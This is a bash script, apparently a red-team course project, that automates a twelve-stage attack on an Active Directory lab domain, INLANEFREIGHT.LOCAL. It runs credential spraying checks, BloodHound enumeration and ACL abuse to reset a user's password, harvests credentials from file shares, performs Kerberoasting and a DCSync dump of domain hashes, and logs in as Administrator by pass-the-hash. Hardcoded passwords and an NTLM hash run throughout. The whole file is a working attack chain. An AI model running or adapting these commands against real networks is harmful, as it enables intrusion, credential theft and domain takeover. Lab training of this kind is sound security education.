#!/bin/bash
# ==============================================================================
# CY376 Red Team Project: Simulated Privilege Escalation & Domain Compromise
# Target Domain: INLANEFREIGHT.LOCAL
# Execution Playbook: 12-Stage Sequential Attack Chain
# Author: Enoch Nana Tabi Oduro 
# Date: August 3, 2026
# ==============================================================================

set -e

DC_IP="172.16.8.3"
MS_IP="172.16.8.50"
DOMAIN="inlanefreight.local"

echo "======================================================================"
echo "[+] Starting Execution Playbook for INLANEFREIGHT.LOCAL Red Team Project"
echo "======================================================================"

# Stage 1: Initial Foothold Verification
echo "[+] Stage 1: Verifying initial credentials (hporter)..."
nxc smb $DC_IP -u hporter -p 'Gr8hambino!' -d $DOMAIN

# Stage 2: Active Directory Enumeration (BloodHound)
echo "[+] Stage 2: Ingesting Active Directory data via BloodHound..."
bloodhound-python -u hporter -p 'Gr8hambino!' -d $DOMAIN -ns $DC_IP -c All --zip

# Stage 3: Abuse ForceChangePassword ACL
echo "[+] Stage 3: Resetting ssmalls password via ForceChangePassword..."
bloodyAD --host $DC_IP -d $DOMAIN -u hporter -p 'Gr8hambino!' set password ssmalls mazoniakid
nxc smb $DC_IP -u ssmalls -p 'mazoniakid' -d $DOMAIN

# Stage 4: File Share Credential Harvesting
echo "[+] Stage 4: Spidering Department Shares for cleartext credentials..."
nxc smb $DC_IP -u ssmalls -p 'mazoniakid' -d $DOMAIN -M spider_plus --share 'Department Shares'

# Stage 5: WinRM Lateral Movement (backupadm -> MS01)
echo "[+] Stage 5: Testing WinRM access to MS01 with backupadm credentials..."
nxc winrm $MS_IP -u backupadm -p '!qazXSW@' -d $DOMAIN

# Stage 6 & 7: Unattend.xml & Local Privilege Escalation (MS01)
echo "[+] Stage 6 & 7: Sysax LPE & unattend.xml artifact recovery on MS01."

# Stage 8: LSA Secrets Dump
echo "[+] Stage 8: Mimikatz LSA Secrets dumped mssqladm : DBAilfreight1!"

# Stage 9: Targeted Kerberoasting via GenericWrite
echo "[+] Stage 9: Setting fake SPN on ttimmons & Kerberoasting..."
bloodyAD --host $DC_IP -d $DOMAIN -u mssqladm -p 'DBAilfreight1!' set object ttimmons servicePrincipalName -v 'acmetesting/LEGIT'
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/mssqladm -request-user ttimmons -outputfile evidence/logs/getuserspns_tgs.log

# Stage 10: Server Admins Group Self-Addition
echo "[+] Stage 10: Adding ttimmons to Server Admins group..."
bloodyAD --host $DC_IP -d $DOMAIN -u ttimmons -p 'Repeat09' add groupMember "Server Admins" ttimmons

# Stage 11: DCSync Attack
echo "[+] Stage 11: Launching DCSync replication attack against DC01..."
secretsdump.py ttimmons:'Repeat09'@$DC_IP -just-dc-ntlm > evidence/logs/secretsdump_ntds.log

# Stage 12: Pass-the-Hash Domain Admin Verification
echo "[+] Stage 12: Authenticating as Administrator via Pass-the-Hash..."
evil-winrm -i $DC_IP -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2

echo "======================================================================"
echo "[+] Attack Chain Playbook Completed Successfully! Domain Compromised."
echo "======================================================================"
